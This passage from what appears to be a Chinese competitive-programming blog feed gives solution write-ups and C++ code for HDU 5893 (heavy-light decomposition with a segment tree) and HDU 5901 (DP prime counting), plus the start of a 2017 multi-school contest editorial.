class="keyword">while</span> (k&lt;n) &#123;</div><div class="line">            <span class="keyword">if</span> ((m&amp;<span class="number">1</span>)==<span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=n;i&gt;k;i--) &#123;</div><div class="line">                    a[i]^=a[i-k];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            m&gt;&gt;=<span class="number">1</span>;k&lt;&lt;=<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d%c"</span>,a[i],<span class="string">" \n"</span>[i==n]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h3&gt;&lt;p&gt;有一个长度为 $n$ 的整数序列 ${a_n}$，对其做 $m$ 次前缀异或和，求最终的序列。&lt;/p&gt;
&lt;h3 id=&quot;题解&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>hdu 5893 List wants to travel</title>
    <link href="https://www.smlight.xyz/2017/08/09/hdu5893/"/>
    <id>https://www.smlight.xyz/2017/08/09/hdu5893/</id>
    <published>2017-08-09T09:26:09.000Z</published>
    <updated>2018-02-12T03:09:05.570Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给出一棵树，要求支持：</p><ol><li>询问从u到v整条路径有几段边权（相同边权连成一段）；</li><li>修改从u到v整条路径的边权。</li></ol><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>首先考虑在序列上的问题，可以用线段树维护颜色段数以及左右端的颜色。<br>对于树上的问题，用树链剖分变成序列上的问题即可。</p><p>但是写起来并不是那么好写的。。。泄露出来的标程写了 6KB 还特别恶心。。。<br>还好我搜到了一份<a href="http://blog.csdn.net/basasuya/article/details/52625574" target="_blank" rel="noopener">非常漂亮的代码</a>，同时建议做树链剖分时把线段树整体作为一个结构体~</p><p>回答询问时还要注意因为两条链都是由浅到深的，拼起来必须有一个要反过来。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;bits/stdc++.h&gt;</span></div><div class="line">using namespace std;</div><div class="line"></div><div class="line">const <span class="keyword">int</span> N=<span class="number">4</span>e4+<span class="number">5</span>;</div><div class="line">struct Edge &#123;</div><div class="line">    <span class="keyword">int</span> go,<span class="keyword">next</span>;</div><div class="line">&#125; eg[N&lt;&lt;<span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> <span class="keyword">last</span>[N],tot,e[N][<span class="number">3</span>];</div><div class="line"><span class="keyword">int</span> num[N],son[N],dep[N],fa[N],<span class="keyword">pos</span>;</div><div class="line"><span class="keyword">int</span> top[N],p[N],fp[N];</div><div class="line"><span class="keyword">int</span> col[N];</div><div class="line"></div><div class="line">void init()</div><div class="line">&#123;</div><div class="line">    tot=<span class="number">0</span>;<span class="keyword">pos</span>=<span class="number">0</span>;</div><div class="line">    memset(<span class="keyword">last</span>,-<span class="number">1</span>,sizeof(<span class="keyword">last</span>));</div><div class="line">    memset(son,-<span class="number">1</span>,sizeof(son));</div><div class="line">&#125;</div><div class="line"></div><div class="line">void addedge(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>)</div><div class="line">&#123;</div><div class="line">    eg[tot]=&#123;<span class="keyword">y</span>,<span class="keyword">last</span>[<span class="keyword">x</span>]&#125;;</div><div class="line">    <span class="keyword">last</span>[<span class="keyword">x</span>]=tot++;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void dfs(<span class="keyword">int</span> u,<span class="keyword">int</span> pre,<span class="keyword">int</span> d)</div><div class="line">&#123;</div><div class="line">    dep[u]=d;</div><div class="line">    fa[u]=pre;</div><div class="line">    num[u]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next) &#123;</div><div class="line">        <span class="keyword">int</span> &amp;v=eg[i].go;</div><div class="line">        <span class="keyword">if</span> (v!=pre) &#123;</div><div class="line">            dfs(v,u,d+<span class="number">1</span>);</div><div class="line">            num[u]+=num[v];</div><div class="line">            <span class="keyword">if</span> (son[u]==-<span class="number">1</span>||num[v]&gt;num[son[u]]) &#123;</div><div class="line">                son[u]=v;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void getpos(<span class="keyword">int</span> u,<span class="keyword">int</span> sp)</div><div class="line">&#123;</div><div class="line">    top[u]=sp;</div><div class="line">    p[u]=++<span class="keyword">pos</span>;</div><div class="line">    fp[p[u]]=u;</div><div class="line">    <span class="keyword">if</span> (son[u]==-<span class="number">1</span>) <span class="keyword">return</span>;</div><div class="line">    getpos(son[u],sp);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="keyword">last</span>[u];i!=-<span class="number">1</span>;i=eg[i].next) &#123;</div><div class="line">        <span class="keyword">int</span> &amp;v=eg[i].go;</div><div class="line">        <span class="keyword">if</span> (v!=son[u]&amp;&amp;v!=fa[u]) &#123;</div><div class="line">            getpos(v,v);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">struct SegTree &#123;</div><div class="line">    struct Node &#123;</div><div class="line">        <span class="keyword">int</span> <span class="keyword">lc</span>,rc,cnt;</div><div class="line">        Node(<span class="keyword">int</span> a=-<span class="number">1</span>,<span class="keyword">int</span> b=<span class="number">0</span>,<span class="keyword">int</span> c=<span class="number">0</span>):<span class="keyword">lc</span>(a),rc(b),cnt(c) &#123;&#125;</div><div class="line">        Node operator +(const Node &amp;R) const &#123;</div><div class="line">            <span class="keyword">if</span> (!cnt) <span class="keyword">return</span> R;</div><div class="line">            <span class="keyword">if</span> (!R.cnt) <span class="keyword">return</span> *this;</div><div class="line">            <span class="keyword">return</span> &#123;<span class="keyword">lc</span>,R.rc,cnt+R.cnt-(rc==R.lc)&#125;;</div><div class="line">        &#125;</div><div class="line">        Node rev() &#123;</div><div class="line">            <span class="keyword">return</span> &#123;rc,<span class="keyword">lc</span>,cnt&#125;;</div><div class="line">        &#125;</div><div class="line">        void <span class="keyword">print</span>() &#123;</div><div class="line">            <span class="keyword">printf</span>(<span class="string">"%d %d %d\n"</span>,<span class="keyword">lc</span>,rc,cnt);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">tr</span>[N&lt;&lt;<span class="number">2</span>];</div><div class="line">    <span class="keyword">int</span> flag[N&lt;&lt;<span class="number">2</span>];</div><div class="line">    <span class="comment">#define lson rt&lt;&lt;1,l,m</span></div><div class="line">    <span class="comment">#define rson rt&lt;&lt;1|1,m+1,r</span></div><div class="line">    void push_up(<span class="keyword">int</span> rt)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">tr</span>[rt]=<span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>]+<span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>];</div><div class="line">    &#125;</div><div class="line">    void push_down(<span class="keyword">int</span> rt)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (flag[rt]!=-<span class="number">1</span>) &#123;</div><div class="line">            flag[rt&lt;&lt;<span class="number">1</span>]=flag[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]=flag[rt];</div><div class="line">            <span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>]=<span class="keyword">tr</span>[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]=&#123;flag[rt],flag[rt],<span class="number">1</span>&#125;;</div><div class="line">            flag[rt]=-<span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    void build(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</div><div class="line">    &#123;</div><div class="line">        flag[rt]=-<span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (l==r) &#123;</div><div class="line">            <span class="keyword">tr</span>[rt]=&#123;col[l],col[l],<span class="number">1</span>&#125;;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> <span class="keyword">m</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        build(lson);</div><div class="line">        build(rson);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    void update(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> L,<span class="keyword">int</span> R,<span class="keyword">int</span> col)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">            <span class="keyword">tr</span>[rt]=&#123;col,col,<span class="number">1</span>&#125;;</div><div class="line">            flag[rt]=col;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        push_down(rt);</div><div class="line">        <span class="keyword">int</span> <span class="keyword">m</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (L&lt;=<span class="keyword">m</span>) update(lson,L,R,col);</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">m</span>&lt;R) update(rson,L,R,col);</div><div class="line">        push_up(rt);</div><div class="line">    &#125;</div><div class="line">    Node getsum(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> L,<span class="keyword">int</span> R)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">tr</span>[rt];</div><div class="line">        &#125;</div><div class="line">        push_down(rt);</div><div class="line">        <span class="keyword">int</span> <span class="keyword">m</span>=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line">        Node res;</div><div class="line">        <span class="keyword">if</span> (L&lt;=<span class="keyword">m</span>) res=res+getsum(lson,L,R);</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">m</span>&lt;R) res=res+getsum(rson,L,R);</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">    &#125;</div><div class="line">    void change(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>,<span class="keyword">int</span> col)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> tx=top[<span class="keyword">x</span>],ty=top[<span class="keyword">y</span>];</div><div class="line">        <span class="keyword">while</span> (tx!=ty) &#123;</div><div class="line">            <span class="keyword">if</span> (dep[tx]&lt;dep[ty]) &#123;</div><div class="line">                swap(tx,ty);</div><div class="line">                swap(<span class="keyword">x</span>,<span class="keyword">y</span>);</div><div class="line">            &#125;</div><div class="line">            update(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[tx],p[<span class="keyword">x</span>],col);</div><div class="line">            <span class="keyword">x</span>=fa[tx];</div><div class="line">            tx=top[<span class="keyword">x</span>];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">x</span>==<span class="keyword">y</span>) <span class="keyword">return</span>;</div><div class="line">        <span class="keyword">if</span> (dep[<span class="keyword">x</span>]&gt;dep[<span class="keyword">y</span>]) &#123;</div><div class="line">            swap(<span class="keyword">x</span>,<span class="keyword">y</span>);</div><div class="line">        &#125;</div><div class="line">        update(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[son[<span class="keyword">x</span>]],p[<span class="keyword">y</span>],col);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> query(<span class="keyword">int</span> <span class="keyword">x</span>,<span class="keyword">int</span> <span class="keyword">y</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> tx=top[<span class="keyword">x</span>],ty=top[<span class="keyword">y</span>];</div><div class="line">        Node X,Y;</div><div class="line">        <span class="keyword">while</span> (tx!=ty) &#123;</div><div class="line">            <span class="keyword">if</span> (dep[tx]&lt;dep[ty]) &#123;</div><div class="line">                Y=getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[ty],p[<span class="keyword">y</span>])+Y;</div><div class="line">                <span class="keyword">y</span>=fa[ty];</div><div class="line">                ty=top[<span class="keyword">y</span>];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                X=getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[tx],p[<span class="keyword">x</span>])+X;</div><div class="line">                <span class="keyword">x</span>=fa[tx];</div><div class="line">                tx=top[<span class="keyword">x</span>];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        Node ans;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">x</span>==<span class="keyword">y</span>) &#123;</div><div class="line">            ans=X.rev()+Y;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">if</span> (dep[<span class="keyword">x</span>]&gt;dep[<span class="keyword">y</span>]) &#123;</div><div class="line">                ans=Y.rev()+getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[son[<span class="keyword">y</span>]],p[<span class="keyword">x</span>])+X;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                ans=X.rev()+getsum(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>,p[son[<span class="keyword">x</span>]],p[<span class="keyword">y</span>])+Y;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ans.cnt;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">#undef lson</span></div><div class="line">    <span class="comment">#undef rson</span></div><div class="line">&#125; mytree;</div><div class="line"></div><div class="line"><span class="keyword">int</span> main()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,<span class="keyword">m</span>;</div><div class="line">    <span class="keyword">while</span> (scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;<span class="keyword">m</span>)!=EOF) &#123;</div><div class="line">        init();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</div><div class="line">            scanf(<span class="string">"%d%d%d"</span>,&amp;e[i][<span class="number">0</span>],&amp;e[i][<span class="number">1</span>],&amp;e[i][<span class="number">2</span>]);</div><div class="line">            addedge(e[i][<span class="number">0</span>],e[i][<span class="number">1</span>]);</div><div class="line">            addedge(e[i][<span class="number">1</span>],e[i][<span class="number">0</span>]);</div><div class="line">        &#125;</div><div class="line">        dfs(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>);</div><div class="line">        getpos(<span class="number">1</span>,<span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (dep[e[i][<span class="number">0</span>]]&lt;dep[e[i][<span class="number">1</span>]]) &#123;</div><div class="line">                swap(e[i][<span class="number">0</span>],e[i][<span class="number">1</span>]);</div><div class="line">            &#125;</div><div class="line">            col[p[e[i][<span class="number">0</span>]]]=e[i][<span class="number">2</span>];</div><div class="line">        &#125;</div><div class="line">        mytree.build(<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pos</span>);</div><div class="line">        <span class="keyword">while</span> (<span class="keyword">m</span>--) &#123;</div><div class="line">            char op[<span class="number">9</span>];</div><div class="line">            <span class="keyword">int</span> u,v,w;</div><div class="line">            scanf(<span class="string">"%s%d%d"</span>,op,&amp;u,&amp;v);</div><div class="line">            <span class="keyword">if</span> (op[<span class="number">0</span>]==<span class="string">'C'</span>) &#123;</div><div class="line">                scanf(<span class="string">"%d"</span>,&amp;w);</div><div class="line">                mytree.change(u,v,w);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">printf</span>(<span class="string">"%d\n"</span>,mytree.query(u,v));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h3&gt;&lt;p&gt;给出一棵树，要求支持：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;询问从u到v整条路径有几段边权（相同边权连成一段）；&lt;/li&gt;
&lt;li&gt;修改从u到v整条路
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>hdu 5901 Count primes</title>
    <link href="https://www.smlight.xyz/2017/08/05/hdu5901/"/>
    <id>https://www.smlight.xyz/2017/08/05/hdu5901/</id>
    <published>2017-08-05T07:46:09.000Z</published>
    <updated>2018-02-12T03:08:23.567Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>输出[1..n]的质数个数 (1 &lt;= n &lt;= 1e11) 。时间限制6s，空间限制64M 。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>很显然，要用线性筛的话时间和空间都不够。</p><p>有一种<a href="https://en.wikipedia.org/wiki/Meissel%E2%80%93Lehmer_algorithm" target="_blank" rel="noopener">Meissel–Lehmer算法</a>可以解决该问题，不过本文要介绍的是一种dp解法。</p><p>定义$SR(n,p)$为，$2..n$被小于等于$p$的质数筛后剩下的数的个数；也就是说，在n的范围内，是质数，或者是只由大于$p$的质数相乘得到的数的个数。<br>记小于等于$n$的质数个数为$\pi(n)$，那么显然有$SR(n,n)=\pi(n)$ 。</p><p>对$SR(n,p)$分两类讨论：</p><ul><li>当$p$不是质数或者$n&lt;p^2$时，有$SR(n,p)=SR(n,p-1)$；</li><li>当$p$是质数且$n\ge p^2$时，$SR(n,p)$ 也可由 $SR(n,p-1)$ 推得：$$SR(n,p)= SR(n,p−1)− SR(\frac{n}{p}, p−1)+ SR(p−1,p−1)$$ 表示要从 $2..p-1$ 筛后剩下的数中去掉那些质因子均大于等于 $p$ 且含 $p$ 的数，因为若有小于 $p$ 的质因子则该数已经被筛去了，同理，该数除以p也一定不会被 $2..p-1$ 筛去，所以减去 $SR(\frac{n}{p}, p−1)$，与此同时 $2..p-1$ 的质数也被减掉了，所以加上 $SR(p-1,p-1)$ 。</li></ul><p>当然因为空间限制肯定不能直接这样dp，考虑到整个过程中只用到了 $p$ 和 $\frac{n}{p}$，我们直接分为两段dp， 用<code>H[k]</code>表示 $k\le \sqrt{n}$ 时 $SR(\frac{n}{k},p)$ 的值，用<code>L[k]</code>表示 $k \le \sqrt{n}$ 时 $SR(k,p)$ 的值。</p><p>先放出代码，原作者<em><a href="http://codeforces.com/profile/adkroxx" target="_blank" rel="noopener">adkroxx</a></em>：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">320000</span>;</div><div class="line">ll H[N],L[N];</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">SR</span><span class="params">(ll n,ll p)</span></span></div><div class="line">&#123;</div><div class="line">    ll m;</div><div class="line">    <span class="keyword">for</span> (m=<span class="number">1</span>;m*m&lt;=n;++m) &#123;</div><div class="line">        H[m]=n/m<span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (ll i=<span class="number">1</span>;i&lt;=m;++i) &#123;</div><div class="line">        L[i]=i<span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (ll i=<span class="number">2</span>;i&lt;=m;++i)&#123;</div><div class="line">        <span class="keyword">if</span> (L[i]==L[i<span class="number">-1</span>]) <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">for</span> (ll j=<span class="number">1</span>;j&lt;=min(m<span class="number">-1</span>,n/i/i);++j) &#123;</div><div class="line">            <span class="keyword">if</span>(i*j&lt;m) H[j]-=H[i*j]-L[i<span class="number">-1</span>];</div><div class="line">            <span class="keyword">else</span> H[j]-=L[n/i/j]-L[i<span class="number">-1</span>];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (ll j=m;j&gt;=i*i;--j) &#123;</div><div class="line">            L[j]-=L[j/i]-L[i<span class="number">-1</span>];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> H[<span class="number">1</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ll n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;n)!=EOF) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,SR(n,n));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><code>L[],H[]</code>初始化为筛内总的个数(不含1)。代码中的<code>i</code>用来枚举质数(<code>L[i]==L[i-1]</code>表示<code>i</code>不是质数)，然后对于 $j&gt;i^2$ 的 $j$ 都更新一遍dp值，只是放在了两个不同的数组而已：对于 $j\le \sqrt{n}$ 的$j$更新<code>L[]</code>，对于 $j&gt;\sqrt{n}$ 的 $j$ 更新<code>H[]</code>。只要理解了递推式代码还是很好理解的。</p><p>这个算法的时间复杂度为$O(n^{\frac{3}{4}})$（证明可以看参考资料内的下一条评论），虽然不如Meissel–Lehmer算法，但是dp的思想非常巧妙，值得学习。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>看到csdn和cnblogs上很多人都是把这份代码当作模板直接贴出来不讲解，不仅不尊重原作者，也有悖大家学习数据结构与算法的初衷，是以我不仅要翻译，还要加上一些自己的理解~~</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://codeforces.com/blog/entry/44466?#comment-290036" target="_blank" rel="noopener">Editorial of Educational Codeforces Round 12</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h3&gt;&lt;p&gt;输出[1..n]的质数个数 (1 &amp;lt;= n &amp;lt;= 1e11) 。时间限制6s，空间限制64M 。&lt;/p&gt;
&lt;h3 id=&quot;题解&quot;
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>2017年多校联训3 部分题解</title>
    <link href="https://www.smlight.xyz/2017/08/02/2017-multi3/"/>
    <id>https://www.smlight.xyz/2017/08/02/2017-multi3/</id>
    <published>2017-08-02T02:29:25.000Z</published>
    <updated>2018-02-21T13:08:52.298Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/08/01/2017%E5%A4%9A%E6%A0%A13" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1003-Kanade’s-sum"><a href="#1003-Kanade’s-sum" class="headerlink" title="1003.    Kanade’s sum"></a>1003.    Kanade’s sum</h3><h3 id="1005-RXD-and-dividing"><a href="#1005-RXD-and-dividing" class="headerlink" title="1005.    RXD and dividing"></a>1005.    RXD and dividing</h3><h3 id="1006-RXD-and-functions"><a href="#1006-RXD-and-functions" class="headerlink" title="1006.    RXD and functions"></a>1006.    RXD and functions</h3><p>易得，$g_m(x)=f(x-\sum a_i)$ 。</p><p>记 $S=\sum a_i $，代入：</p><p>$$\large \begin{equation}\begin{split}<br>g_m(x)&amp;=\sum_{i=0}^{n}c_i(x-S)^i \\<br>&amp;=\sum_{i=0}^{n}c_i\sum_{j=0}^{i}C_{i}^{j}x^j(-S)^{i-j} \\<br>&amp;=x^0\sum_{j=0}^{n}c_jC_{j}^{0}(-S)^{j-0}+\cdots+x^n\sum_{j=0}^{n}c_jC_{j}^{n}(-S)^{j-n} \\<br>&amp;=\sum_{i=0}^{n}x^i\sum_{j=0}^{n}c_jC_{j}^{i}(-S)^{j-i} \\<br>&amp;=\sum_{i=0}^{n}x^i\sum_{j=i}^{n}c_j\cfrac{j!}{i!\cdot 